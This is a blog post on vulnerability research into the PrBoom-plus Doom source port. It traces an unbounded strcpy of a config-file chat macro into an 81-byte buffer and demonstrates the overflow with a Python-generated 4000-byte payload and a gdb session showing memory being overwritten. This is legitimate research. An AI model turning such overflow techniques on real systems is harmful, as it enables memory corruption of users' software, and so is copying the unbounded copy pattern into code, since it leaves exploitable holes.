As in the previous post, I was digging in [PrBoom-plus's code](https://svn.prboom.org/repos/branches/prboom-plus-24/prboom2/). When I was going through `hu_stuff.c` these two variables caught my eye:

{% highlight x %}
189  dboolean           message_dontfuckwithme;
190  static dboolean    message_nottobefuckedwith;
{% endhighlight %}

It's always funny to find such names in source code. It was even better when I found out that it's part of [original Doom's code](https://github.com/id-Software/DOOM/blob/77735c3ff0772609e9c8d29e3ce2ab42ff54d20b/linuxdoom-1.10/hu_stuff.c#L99). So I took a challange I tried to have some fun with it.


### chat macro buffer overflow

I looked at code in `m_misc.c` responsible for parsing a configuration file. I noticed that chat macro variables are accepted with quite large length limit (excatly 31988 bytes). 

{% highlight x %}
706    {"Chat macros",{NULL},{0},UL,UL,def_none,ss_none},
707    {"chatmacro0", {0,&chat_macros[0]}, {0,HUSTR_CHATMACRO0},UL,UL,
708     def_str,ss_chat}, // chat string associated with 0 key
[...]
1415  #define CFG_BUFFERMAX 32000
[...]
1500    f = fopen (defaultfile, "r");
[...]
1507        fgets(cfgline, CFG_BUFFERMAX, f);
1508        if (sscanf (cfgline, "%79s %[^\n]\n", def, strparm) == 2)
{% endhighlight %}

These macros may be used during the game by starting chat (by pressing `t`) and then selecting a specific macro with a key combination `alt` + macro number. Code responsible for handling this situation is in `hu_stuff.c`

{% highlight x %}
2820      if (altdown)
2821      {
2822        c = c - '0';
2823        if (c > 9)
2824          return false;
2825        macromessage = chat_macros[c];
2826  
2827        // kill last message with a '\n'
2828          HU_queueChatChar((char)key_enter); // DEBUG!!!                // phares
2829  
2830        // send the macro message
2831        while (*macromessage)
2832          HU_queueChatChar(*macromessage++);
2833        HU_queueChatChar((char)key_enter);                            // phares
2834  
2835        // leave chat mode and notify that it was sent
2836        chat_on = false;
2837        strcpy(lastmessage, chat_macros[c]);
2838        plr->message = lastmessage;
2839        eatkey = true;
2840      }
{% endhighlight %}

Macro message is retrieved from the array at line 2825, lines 2827 - 2833 are responsible for preparing the text to be displayed. Then, at line 2837 the text (which has no length boundaries) is copied to `lastmessage` variable. This buffer has fixed size, 81 bytes.

`hu_lib.h`:
{% highlight x %}
51  #define HU_MAXLINELENGTH  80
{% endhighlight %}

`hu_stuff.c`:
{% highlight x %}
2722    static char   lastmessage[HU_MAXLINELENGTH+1];
{% endhighlight %}

Summarizing, we have control over `chat_macros` value, which may have up to 31988 bytes read from configuration file. Then, these bytes are copied the `lastmessage` for which only 81 bytes are allocated - this is typical buffer overflow. As uninitialized global and static variables reside in a .`bss` segment, I hoped that I will be able use this overflow to overwrite them.

I prepared a configuration file with a payload (0x61 is *a*):
{% highlight x %}
# python -c 'print "chatmacro0 \"" + "\x61" * 4000 + "\""' > test.cfg
# cat test.cfg
chatmacro0 "aaaaaaaaaaaaaaaaaaaaa[...]
{% endhighlight %}

I compiled the game with additional compiler flag `-D_FORTIFY_SOURCE=0` which disables a modern protection against buffer overflow exploitation. Then I started the server and the first client.
{% highlight x %}
root@ubuntu16:~/projects/prboom-plus/prboom2/bin/games# ./prboom-plus-game-server 
Listening on port 5030, waiting for 2 players
{% endhighlight %}
{% highlight x %}
root@ubuntu16:~/projects/prboom-plus/prboom2/bin/games# ./prboom-plus -iwad /root/projects/prboom-plus/freedm-0.11.3/freedm.wad -net 127.0.0.1 -window -nomouse
{% endhighlight %}

The second client I ran using gdb,
{% highlight x %}
root@ubuntu16:~/projects/prboom-plus/prboom2/bin/games# gdb --args ./prboom-plus -iwad /root/projects/prboom-plus/freedm-0.11.3/freedm.wad -net 127.0.0.1 -window -nomouse -config /root/projects/prboom-plus/test.cfg
{% endhighlight %}
and set up a breakpoint on vulnerable line (`strcpy` invocation).
{% highlight x %}
(gdb) break hu_stuff.c:2837
Breakpoint 1 at 0x80a00ce: file hu_stuff.c, line 2837.
(gdb) c
Continuing.
{% endhighlight %}

In the game I used my macro (by pressing `t` and `alt` + `0`), and the breakpoint was hit.
{% highlight x %}
Thread 1 "prboom-plus" hit Breakpoint 1, HU_Responder (ev=0xbf836cd4) at hu_stuff.c:2837
2837        strcpy(lastmessage, chat_macros[c]);
{% endhighlight %}

Memory before triggering vulnerablity:
{% highlight x %}
(gdb) x/4x &message_nottobefuckedwith 
0x817d568 <message_nottobefuckedwith>:  0x00000000  0x00000000  0x00000000  0x00000000
{% endhighlight %}
just one step calling `strcpy`,
{% highlight x %}
(gdb) n
2838        plr->message = lastmessage;
{% endhighlight %}
and the result shows how I fucked with DOOM and its *message_nottobefuckedwith*:
{% highlight x %}
(gdb) x/4x &message_nottobefuckedwith 
0x817d568 <message_nottobefuckedwith>:  0x61616161  0x61616161  0x61616161  0x61616161
{% endhighlight %}
